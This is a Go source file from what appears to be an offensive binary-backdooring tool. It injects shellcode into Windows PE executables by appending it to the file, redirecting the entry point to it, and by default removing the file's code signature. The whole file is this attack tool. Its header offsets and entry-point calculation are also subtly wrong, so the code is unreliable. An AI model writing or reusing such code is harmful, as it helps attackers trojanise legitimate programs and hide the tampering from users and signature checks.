package injector

import (
	"encoding/binary"
	"fmt"
	"os"

	"github.com/Binject/debug/pe"
)

// injectEntrypoint performs entry point hijacking injection
// This method modifies the entry point to jump to shellcode
func (i *Injector) injectEntrypoint(pePath string, shellcode []byte) (*Result, error) {
	// Open PE file
	file, err := pe.Open(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to open PE file: %v", err),
		}, err
	}
	defer file.Close()

	// Read the original file
	data, err := os.ReadFile(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to read PE file: %v", err),
		}, err
	}

	// Get original entry point
	var origEntryPoint uint32

	switch opt := file.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		origEntryPoint = opt.AddressOfEntryPoint
	case *pe.OptionalHeader64:
		origEntryPoint = opt.AddressOfEntryPoint
	default:
		return &Result{
			Success: false,
			Message: "Unknown PE format",
		}, fmt.Errorf("unknown PE format")
	}

	// Find or create space for shellcode
	// Append shellcode to the end of the file
	newSectionOffset := len(data)

	// Align shellcode to 16 bytes
	alignedSize := (len(shellcode) + 15) & ^15

	// Extend file data
	newData := make([]byte, len(data)+alignedSize)
	copy(newData, data)
	copy(newData[newSectionOffset:], shellcode)

	// Calculate new entry point RVA
	// Need to convert file offset to RVA
	newEntryPoint, err := fileOffsetToRVA(file, uint32(newSectionOffset))
	if err != nil {
		// If conversion fails, just use file offset as approximate
		newEntryPoint = uint32(newSectionOffset)
	}

	// Update entry point in the new data
	peOffset := binary.LittleEndian.Uint32(newData[60:64])
	optHeaderOffset := peOffset + 4
	magic := binary.LittleEndian.Uint16(newData[optHeaderOffset : optHeaderOffset+2])

	if magic == 0x10b { // PE32
		binary.LittleEndian.PutUint32(newData[optHeaderOffset+16:], newEntryPoint)
	} else if magic == 0x20b { // PE32+
		binary.LittleEndian.PutUint32(newData[optHeaderOffset+16:], newEntryPoint)
	}

	// Output path
	outputPath := pePath + ".patched"

	// Write modified file
	if err := os.WriteFile(outputPath, newData, 0644); err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to write output file: %v", err),
		}, err
	}

	// Clear signature if not preserving
	if !i.options.PreserveSig {
		if err := ClearSignature(outputPath); err != nil {
			fmt.Printf("Warning: failed to clear signature: %v\n", err)
		}
	}

	return &Result{
		Success:    true,
		Message:    fmt.Sprintf("Entry point injection successful. Old EP: 0x%X, New EP: 0x%X", origEntryPoint, newEntryPoint),
		OutputPath: outputPath,
	}, nil
}

// fileOffsetToRVA converts file offset to RVA
func fileOffsetToRVA(file *pe.File, offset uint32) (uint32, error) {
	for _, section := range file.Sections {
		if offset >= section.Offset && offset < section.Offset+section.Size {
			return section.VirtualAddress + (offset - section.Offset), nil
		}
	}
	return 0, fmt.Errorf("offset not found in any section")
}
